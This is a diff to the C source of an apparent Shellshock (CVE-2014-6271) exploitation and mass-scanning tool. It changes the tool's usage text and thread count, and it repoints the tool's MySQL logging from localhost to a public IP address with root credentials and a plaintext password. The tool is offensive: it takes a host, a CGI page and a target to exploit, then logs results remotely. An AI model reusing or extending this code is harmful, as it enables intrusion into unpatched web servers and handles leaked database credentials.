@@ -32,9 +32,9 @@
 // end USERAGENT Fake
 
 // Mysql Details begin
-char *mysqlhost = "localhost";
+char *mysqlhost = "84.113.20.105";
 char *mysqluser = "root";
-char *mysqlpass = "password";
+char *mysqlpass = "planquard4";
 char *mysqldb1 = "test";
 int mysqlport = 3306;
 //sock
@@ -261,7 +261,7 @@ void usage()
   fprintf(stderr, "\n\x1b[33m\tUSAGE: %s HOST PAGE TARGET\n\n\
 \t\t\x1b[31m exploiting shellshock CVE-2014-6271... \n\n\
 \tHOST: the ip address. ex: 192.168.0.1\n\
-\tPAGE: the page to retrieve. ex: cgi-bin/index.cgi, default: /\n\
+\tPAGE: the page to retrieve. ex: cgi-bin/bin, default: /\n\
 \tTARGET: the target hostname. ex: www.target.org\n\n\x1b[0m",appli);
 	iam();
 }
@@ -805,7 +805,7 @@ int main(int argc, char **argv)
     // Create Our Scan Job
     Scan_Job hScanJob;
     hScanJob.IPAddress      = argv[1];
-    hScanJob.totalThreads   = 255;
+    hScanJob.totalThreads   = 30;
     hScanJob.ptrIP          = &hScanJob.IPAddress;
     
 	mysqlinp(host,page,target);
